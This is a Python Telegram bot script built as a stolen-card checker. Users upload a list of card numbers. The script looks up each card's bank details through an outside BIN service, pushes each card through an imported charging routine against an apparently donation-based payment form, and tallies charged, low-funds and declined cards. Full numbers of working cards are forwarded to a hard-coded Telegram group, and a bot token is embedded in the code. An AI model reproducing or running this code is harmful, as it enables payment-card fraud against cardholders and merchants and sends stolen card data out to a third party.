import requests
import telebot
import time
from telebot import types
from authcha import Tele
import os

token = '7314829410:AAGarNBfgbH1TpKhh3p5NTTJxWRBKDYz0G4'
bot = telebot.TeleBot(token, parse_mode="HTML")
CHAT_ID = '-4901679891'
#message ="HI"

@bot.message_handler(commands=["start"])
def start(message):
    if str(message.chat.id) == 'Telegram_ID':
        bot.reply_to(message, "You cannot use the bot to contact developers to purchase a bot subscription Free")
        return
    bot.reply_to(message, "Send the file now")
    #bot.send_message(CHAT_ID, "sent file")

@bot.message_handler(content_types=["document"])
def main(message):
    if str(message.chat.id) == 'Telegram_ID':
        bot.reply_to(message, "You cannot use the bot to contact developers to purchase a bot subscription Free")
        return

    dd = 0
    live = 0
    ch = 0
    ccn = 0
    cvv = 0
    lowfund = 0
    ko = bot.reply_to(message, "CHECKING....⌛").message_id

    ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
    with open("combo.txt", "wb") as w:
        w.write(ee)

    try:
        with open("combo.txt", 'r') as file:
            lino = file.readlines()
            total = len(lino)

            for cc in lino:
                current_dir = os.getcwd()
                for filename in os.listdir(current_dir):
                    if filename.endswith(".stop"):
                        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='STOP ✅\nBOT BY ➜ Free')
                        os.remove('stop.stop')
                        return

                try:
                    data = requests.get(f'https://bins.antipublic.cc/bins/{cc[:6]}').json()
                except:
                    data = {}

                brand = data.get('brand', 'Unknown')
                card_type = data.get('type', 'Unknown')
                country = data.get('country_name', 'Unknown')
                country_flag = data.get('country_flag', 'Unknown')
                bank = data.get('bank', 'Unknown')

                start_time = time.time()

                try:
                    last = Tele(cc)
                except Exception as e:
                    print(e)
                    last = 'missing payment form'

                print(last)
                # Update message panel
                mes = types.InlineKeyboardMarkup(row_width=1)
                cm1 = types.InlineKeyboardButton(f"🃏 {cc.strip()}", callback_data='u8')
                status = types.InlineKeyboardButton(f"⚡ {last}", callback_data='u8')
                cm3 = types.InlineKeyboardButton(f"🔥 CHARGED ➤ {ch}", callback_data='x')
                cm6 = types.InlineKeyboardButton(f"💰 LOW FUNDS ➤ {lowfund}", callback_data='x')
                cm7 = types.InlineKeyboardButton(f"❌ DECLINED ➤ {dd}", callback_data='x')
                cm8 = types.InlineKeyboardButton(f"📊 TOTAL ➤ {total}", callback_data='x')
                stop = types.InlineKeyboardButton(f"🛑 STOP", callback_data='stop')
                mes.add(cm1, status, cm3, cm6, cm7, cm8, stop)

                end_time = time.time()
                execution_time = end_time - start_time

                bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''Wait For Processing   
by ➜ Free ''', reply_markup=mes)

                # ✅ CHARGED CASES
                if isinstance(last, dict) and last.get('success') is True and \
                   "Thank you for your donation!" in str(last.get('data', {}).get('result', {}).get('message', '')):

                    ch += 1
                    msg = f'''🔥 CHARGE SUCCESS! 🔥

🃏 CARD ➤ <code>{cc.strip()}</code>
⚡ STATUS ➤ LIVE & CHARGED
🎲 BIN ➤ <code>{cc[:6]} [{brand}]</code>
🏦 BANK ➤ <code>{bank}</code>
🌎 LOCATION ➤ <code>{country} {country_flag}</code>
🚀 SPEED ➤ <code>{execution_time:.1f}s</code>

Made by Free'''
                    bot.reply_to(message, msg)
                    bot.send_message(CHAT_ID, msg)

                # ❌ INSUFFICIENT FUNDS
                elif isinstance(last, dict) and (
                    ("insufficient funds" in str(last.get('errors', '')).lower()) or
                    ("insufficient funds" in str(last.get('message', '')).lower())
                ):


                    lowfund += 1
                    msg = f'''💰 LOW FUNDS! 💰

🃏 CARD ➤ <code>{cc.strip()}</code>
⚠️ STATUS ➤ INSUFFICIENT FUNDS
🎲 BIN ➤ <code>{cc[:6]} [{brand}]</code>
🏦 BANK ➤ <code>{bank}</code>
🌎 LOCATION ➤ <code>{country} {country_flag}</code>
🚀 SPEED ➤ <code>{execution_time:.1f}s</code>

Made by Free'''
                    bot.reply_to(message, msg)
                    bot.send_message(CHAT_ID, msg)

                # ❌ DECLINED or UNKNOWN
                else:
                    dd += 1
                time.sleep(3)

    except Exception as e:
        print(e)

    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='CHECKED ✅\nBOT BY ➜ Free')

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
    with open("stop.stop", "w") as file:
        pass

print("+-----------------------------------------------------------------+")
try:
    bot.infinity_polling(timeout=60, long_polling_timeout=30)
except Exception as e:
    print("Polling error:", e)
